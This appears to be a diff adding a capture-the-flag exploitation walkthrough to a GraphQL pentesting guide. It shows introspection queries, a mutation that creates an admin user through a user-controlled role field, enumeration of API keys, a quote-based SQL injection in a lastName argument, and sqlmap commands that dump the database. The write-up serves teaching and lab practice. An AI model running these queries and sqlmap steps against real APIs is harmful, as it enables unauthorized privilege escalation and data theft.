@@ -16,6 +16,7 @@ This document outlines common techniques for identifying and exploiting vulnerab
     - [Mutations](#mutations)
 
   - [Tools](#tools)
+  - [Exploitation - Example](#exploitation---example)
 
 
 ---
@@ -962,3 +963,581 @@ All extracted schema and introspection information is displayed within the `InQL
 ![Filtered output](images/tools3.PNG)
 
 ---
+
+## Exploitation - Example
+
+### Enumerating Available Mutations
+
+Using GraphQL introspection, we enumerate all available mutations exposed by the API:
+
+```graphql
+query {
+  __schema {
+    mutationType {
+      name
+      fields {
+        name
+        args {
+          name
+          defaultValue
+          type {
+            ...TypeRef
+          }
+        }
+      }
+    }
+  }
+}
+
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+Reponse:
+
+```graphql
+{
+  "data": {
+    "__schema": {
+      "mutationType": {
+        "name": "Mutation",
+        "fields": [
+          {
+            "name": "addEmployee",
+            "args": [
+              {
+                "name": "input",
+                "defaultValue": null,
+                "type": {
+                  "kind": "NON_NULL",
+                  "name": null,
+                  "ofType": {
+                    "kind": "INPUT_OBJECT",
+                    "name": "AddEmployeeInput",
+                    "ofType": null
+                  }
+                }
+              }
+            ]
+          },
+          {
+            "name": "addProduct",
+            "args": [
+              {
+                "name": "input",
+                "defaultValue": null,
+                "type": {
+                  "kind": "NON_NULL",
+                  "name": null,
+                  "ofType": {
+                    "kind": "INPUT_OBJECT",
+                    "name": "AddProductInput",
+                    "ofType": null
+                  }
+                }
+              }
+            ]
+          },
+          {
+            "name": "addCustomer",
+            "args": [
+              {
+                "name": "input",
+                "defaultValue": null,
+                "type": {
+                  "kind": "NON_NULL",
+                  "name": null,
+                  "ofType": {
+                    "kind": "INPUT_OBJECT",
+                    "name": "AddCustomerInput",
+                    "ofType": null
+                  }
+                }
+              }
+            ]
+          }
+        ]
+      }
+    }
+  }
+}
+```
+
+The API exposes three mutations:
+
+- `addEmployee`
+- `addProduct`
+- `addCustomer`
+
+The `addEmployee` mutation is of particular interest, as it may allow **privilege escalation**. This mutation requires an `AddEmployeeInput` object. To determine which fields can be supplied, we enumerate the input object definition:
+
+```graphql
+{   
+  __type(name: "AddEmployeeInput") {
+    name
+    inputFields {
+      name
+      description
+      defaultValue
+    }
+  }
+}
+```
+
+Response:
+
+```graphql
+{
+  "data": {
+    "__type": {
+      "name": "AddEmployeeInput",
+      "inputFields": [
+        {
+          "name": "username",
+          "description": null,
+          "defaultValue": null
+        },
+        {
+          "name": "employeeId",
+          "description": null,
+          "defaultValue": null
+        },
+        {
+          "name": "role",
+          "description": null,
+          "defaultValue": null
+        }
+      ]
+    }
+  }
+}
+```
+
+![Filtered output](images/exploit2.PNG)
+
+The `AddEmployeeInput` object contains the following fields:
+
+- `username`
+- `employeeId`
+- `role`
+
+The presence of a user-controllable `role` field strongly suggests a **privilege escalation vulnerability**, as no restrictions are enforced at the schema level.
+
+Before exploiting this, we query existing employees to understand how employee data is stored.
+
+```graphql
+{
+  allEmployees {
+    id
+    username
+    employeeId
+    role
+  }
+}
+```
+
+Response:
+
+```graphql
+{
+  "data": {
+    "allEmployees": [
+      {
+        "id": "RW1wbG95ZWVPYmplY3Q6MQ==",
+        "username": "vautia",
+        "employeeId": 1337,
+        "role": "employee"
+      },
+      {
+        "id": "RW1wbG95ZWVPYmplY3Q6Mg==",
+        "username": "pedant",
+        "employeeId": 1338,
+        "role": "employee"
+      },
+      {
+        "id": "RW1wbG95ZWVPYmplY3Q6Mw==",
+        "username": "21y4d",
+        "employeeId": 1339,
+        "role": "manager"
+      }
+    ]
+  }
+}
+```
+
+![Filtered output](images/exploit.PNG)
+
+The `id` field appears to be Base64-encoded. However, this value is generated server-side and does not need to be supplied when creating a new employee.
+
+We first attempt to create a standard employee:
+
+```graphql
+mutation {
+  addEmployee(input: {username: "sam", employeeId: 1340, role: "employee"}) {
+    employee {
+      id
+      username
+      employeeId
+      role
+    }
+  }
+}
+```
+
+Response:
+
+```graphql
+{
+  "data": {
+    "addEmployee": {
+      "employee": {
+        "id": "RW1wbG95ZWVPYmplY3Q6NA==",
+        "username": "sam",
+        "employeeId": 1340,
+        "role": "employee"
+      }
+    }
+  }
+}
+```
+
+![Filtered output](images/exploit3.PNG)
+
+Next, we attempt to assign an elevated role by setting `role` to `admin`:
+
+```graphql
+mutation {
+  addEmployee(input: {username: "administrator", employeeId: 1340, role: "admin"}) {
+    employee {
+      id
+      username
+      employeeId
+      role
+    }
+  }
+}
+```
+
+Response:
+
+```graphql
+{
+  "data": {
+    "addEmployee": {
+      "employee": {
+        "id": "RW1wbG95ZWVPYmplY3Q6NQ==",
+        "username": "administrator",
+        "employeeId": 1340,
+        "role": "admin"
+      }
+    }
+  }
+}
+```
+
+![Filtered output](images/exploit4.PNG)
+
+This confirms an **unauthenticated privilege escalation vulnerability**. However, since the user-facing portion of the application is disabled, logging in as this user is not possible.
+
+We therefore continue by probing the API for SQL injection vulnerabilities.
+### SQL Injection
+
+Using introspection and the GraphiQL **Document Explorer**, we identify queries that accept user-controlled arguments, making them potential injection points:
+
+- `node(id: ID!)`
+- `employeeByUsername(username: String!)`
+- `productByName(name: String!)`
+- `allCustomers(apiKey: String!)`
+- `customerByName(apiKey: String!, lastName: String!)`
+
+![Filtered output](images/exploit5.PNG)
+
+Each query is tested individually.
+
+SQL injection attempt:
+
+```graphql
+{
+  employeeByUsername(username: "administrator'") {
+    id
+    username
+    employeeId
+    role
+  }
+}
+```
+
+Not injectable:
+
+```graphql
+{
+  "data": {
+    "employeeByUsername": null
+  }
+}
+```
+
+SQL injection attempt:
+
+```graphql
+{
+  node(id: "1'") {
+    id
+  }
+}
+```
+
+Not injectable:
+
+```graphql
+{
+  "data": {
+    "node": null
+  }
+}
+```
+
+
+SQL injection attempt:
+
+```graphql
+{
+  productByName(name: "gpu'") {
+    id
+    name
+    stock
+  }
+}
+```
+
+Not injectable:
+
+```graphql
+{
+  "data": {
+    "productByName": null
+  }
+}
+```
+
+The remaining queries require an `apiKey`. We enumerate valid API keys using the following query:
+
+**API keys:**
+
+```graphql
+{
+  activeApiKeys {
+    id
+	  role
+    key
+  }
+}
+```
+
+**Response:**
+
+```graphql
+{
+  "data": {
+    "activeApiKeys": [
+      {
+        "id": "QXBpS2V5T2JqZWN0OjE=",
+        "role": "guest",
+        "key": "fbb64ce26fbe8a8d8d6895b8e6ba21a3"
+      },
+      {
+        "id": "QXBpS2V5T2JqZWN0OjI=",
+        "role": "guest",
+        "key": "9cf8622bbc9fdc78f245663e08e5b4c1"
+      },
+      {
+        "id": "QXBpS2V5T2JqZWN0OjM=",
+        "role": "admin",
+        "key": "0711a879ed751e63330a78a4b195bbad"
+      }
+    ]
+  }
+}
+```
+
+SQL injection attempt:
+
+```graphql
+{
+allCustomers(apiKey: "0711a879ed751e63330a78a4b195bbad'") {
+    id
+		firstName
+  	lastName
+  	address
+  	id
+  }
+}
+```
+
+Not injectable:
+
+```graphql
+{
+  "data": {
+    "allCustomers": null
+  }
+}
+```
+
+We first enumerate customers using a valid admin API key:
+
+```graphql
+{
+allCustomers(apiKey: "0711a879ed751e63330a78a4b195bbad") {
+    id
+		firstName
+  	lastName
+  	address
+  	id
+  }
+}
+```
+
+Response:
+
+```graphql
+{
+  "data": {
+    "allCustomers": [
+      {
+        "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",
+        "firstName": "Antony",
+        "lastName": "Blair",
+        "address": "13 Hide A Way Road. Winter Park, FL 32789"
+      },
+      {
+        "id": "Q3VzdG9tZXJPYmplY3Q6Mg==",
+        "firstName": "Margaret",
+        "lastName": "Liverman",
+        "address": "4797 New Street. Coos Bay, OR 97420 "
+      },
+      {
+        "id": "Q3VzdG9tZXJPYmplY3Q6Mw==",
+        "firstName": "Billy",
+        "lastName": "Sawyer",
+        "address": "587 Hickory Lane. Washington, DC 20017 "
+      }
+    ]
+  }
+}
+```
+
+We then attempt SQL injection via the `lastName` parameter:
+
+```graphql
+{
+customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "Sawyer'") {
+    id
+		firstName
+  	lastName
+  	address
+  	id
+  }
+}
+```
+
+This results in a database error:
+
+```graphql
+{
+  "errors": [
+    {
+      "message": "(pymysql.err.ProgrammingError) (1064, \"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''Sawyer'' \\n LIMIT 1' at line 3\")\n[SQL: SELECT customer.id AS customer_id, customer.`firstName` AS `customer_firstName`, customer.`lastName` AS `customer_lastName`, customer.address AS customer_address \nFROM customer \nWHERE lastName='Sawyer'' \n LIMIT %(param_1)s]\n[parameters: {'param_1': 1}]\n(Background on this error at: https://sqlalche.me/e/20/f405)",
+      "locations": [
+        {
+          "line": 1,
+          "column": 2
+        }
+      ],
+      "path": [
+        "customerByName"
+      ]
+    }
+  ],
+  "data": {
+    "customerByName": null
+  }
+}
+```
+
+![Filtered output](images/exploit6.PNG)
+
+This confirms a **SQL injection vulnerability** in the `lastName` argument.
+
+Using the captured request, we enumerate the backend database:
+
+```bash
+sqlmap -r req.txt --banner --current-user --current-db --is-dba --batch
+```
+
+- Banner: `10.11.6-MariaDB-0+deb12u1`
+- Current user: `db@localhost`
+- Current database: `db`
+- Is DBA: `false`
+
+![Filtered output](images/exploit7.PNG)
+
+We enumerate all tables:
+
+```bash
+sqlmap -r req.txt --tables -D db --batch
+```
+
+There are five tables:
+
+- `api_key`
+- `customer`
+- `employee`
+- `flag`
+- `product`
+
+![Filtered output](images/exploit8.PNG)
+
+Finally, we dump the `flag` table:
+
+```bash
+sqlmap -r req.txt -D db -T flag --dump --batch
+```
+
+The flag is successfully retrieved:
+
+```
+HTB{f1d663c11e6db634e1c9403d0e8e3a35}
+```
+
+![Filtered output](images/exploit9.PNG)
